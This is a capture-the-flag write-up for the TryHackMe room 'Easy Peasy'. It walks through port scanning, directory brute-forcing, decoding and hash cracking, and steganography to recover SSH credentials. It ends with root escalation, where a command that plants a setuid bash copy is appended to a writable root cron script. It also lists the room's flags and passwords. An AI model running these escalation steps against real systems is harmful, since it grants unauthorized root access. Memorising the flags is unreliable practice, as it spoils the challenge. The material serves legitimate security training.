---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - decoding
  - brute-force
  - steganography
  - crontab-abuse
---

# Easy Peasy
![Easy Peasy logo](logos/easy_peasy_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [EasyPeasy](https://tryhackme.com/room/easypeasyctf)  

## Description
"Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob."

## Enumeration
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRES
```

```
Host is up (0.020s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "How many ports are open?"
	3
??? success "What is the version of nginx?"
	1.16.1
??? success "What is running on the highest port?"
	Apache  

### HTTP enumeration (port 80)
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* `robots.txt` file disallows all entries - no hidden directories  
* No `sitemap` file
* Web page: default installation page  
* Nothing interesting in the source code  
* `/hidden` directory has a single image on display

**Action(s)**  
:white_check_mark: New `ffuf` scan with `/hidden` directory as root  
*No new findings*  
:white_check_mark: Download image file for further analysis  
*Downloaded and saved as `hiddden_80.jpg`*  

**Notes**  

* `/whatever` directory has a single image on display  
* Hidden element in source code - "ZmxhZ3tmMXJzN19mbDRnfQ=="

**Action(s)**  
:white_check_mark: New `ffuf` scan with `/whatever` directory as root 
:white_check_mark: Download image file for further analysis  
*Downloaded and saved as `whatever_80.jpg`*  
:white_check_mark: Decode base64 encoded hidden HTML element with `echo 'ELEMENT' | base64 -d`  
??? success "Using GoBuster, find flag 1."
	flag{f1rs7_fl4g}

### HTTP Enumeration (port 65524)
```
ffuf -u http://TARGET_IP_ADDRESS:65524/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS:65524 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```  

**Notes**  

* No `sitemap` file  
* Web page: default installation page but contains Flag 3  
* Hidden element in source code with encoded value  
* `robots.txt` file disallows all entries but provides a potential user-agent string that must be used to enumerate web application  
* No results in `ffuf` or `gobuster` scans  
??? success "What is the flag 3?"
	flag{9fdafbd64c47471a8f54cd3fc64cd312}

**Actions**  
:white_check_mark: Decode encoded value found in source code with [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)  
*Identifies as base62 - decodes to hidden directory value*  
??? success "What is the hidden directory?"
	/n0th1ng3ls3m4tt3r  
:white_check_mark: Rerun `gobuster` scan with discovered user-agent string  
*Done: unsuccessful*  
:white_check_mark: user-agent string looks like an MD5 hash - try to crack.  
*Much wasted time - turns out this hash can only be cracked with one particular [website](https://md5hashing.net/)*  
??? success "Further enumerate the machine, what is flag 2?"
	flag{1m_s3c0nd_fl4g}  
:white_check_mark: Enumerate newly discovered hidden directory  

**Notes**  

* Long string found in source code - appears to be a hash of some sort  
* Image hosted on website available for download  

**Actions**  
:white_check_mark: Determine if long string in source code is a hash with `hashid`  
`hashid -m 'STRING'`  
*Identified as a number of possibilities*  
:white_check_mark: Attempt to crack hash with `hashcat` + hash modes identified by `hashid`  + word list provided in challenge
```
echo 'STRING' > hash
hashcat -m 1400 hash WORDLIST	# Unsuccessful
hashcat -m 6900 hash WORDLIST	# Successful
```
??? success "Using the wordlist that provided to you in this task crack the hash. What is the password?"
	mypasswordforthatjob  
:white_check_mark: Download image from site to check for steganography possibilities
```
exiftool IMAGE				# Unsuccessful
strings IMAGE				# Unsuccessful
binwalk IMAGE				# Unsuccessful
steghide extract -sf IMAGE	# Without password: unsuccessful
steghide extract -sf IMAGE	# With password from source code: successful
```

**Notes**  

* Data extracted from image file to `secrettext.txt`  
* Extracted file contains SSH credentials  
* Password appears encoded as binary  

### Vulnerability Enumeration
```
searchsploit nginx 1.16.1	# No results
searchsploit OpenSSH 7.6p1	# Only result: username enumeration
searchsploit httpd 2.4.43	# Only result: DoS
```

## Foothold
**Actions**  
:white_check_mark: Use [CyberChef](https://gchq.github.io/CyberChef/) to decode SSH credentials  

**Notes**  

??? success "What is the password to login to the machine via SSH?"
	iconvertedmypasswordtobinary

### User flag
```
ssh boring@10.130.180.191 -p 6498
boring@kral4-PC:~$ ls -l
total 4
-rw-r--r-- 1 boring boring 83 Jun 14  2020 user.txt
boring@kral4-PC:~$ cat user.txt
```

**Notes**  

* Contents of `user.txt` appear to be ROT-encoded

**Actions**  
:white_check_mark: Use CyberChef to brute-force ROT encoding  
*ROT13 breaks encoding*  
??? success "What is the user flag?"
	flag{n0wits33msn0rm4l}

## Privilege Escalation
```
sudo -l 	# Unsuccessful
groups		# Unsuccessful
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

boring@kral4-PC:~$ ls -l cd /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root

boring@kral4-PC:~$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /var/www/.mysecretcronjob.sh
boring@kral4-PC:~$ /tmp/rootbash -p
rootbash-4.4# ls -al /root
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
rootbash-4.4# cat /root/.root.txt
```
??? success "What is the root flag?"
	flag{63a9f0ea7bb98050796b649e85481845}

**Tools Used**  
`ffuf` `hashid` `hashcat` `steghide` `CyberChef`

**Date completed:** 23/04/26  
**Date published:** 23/04/26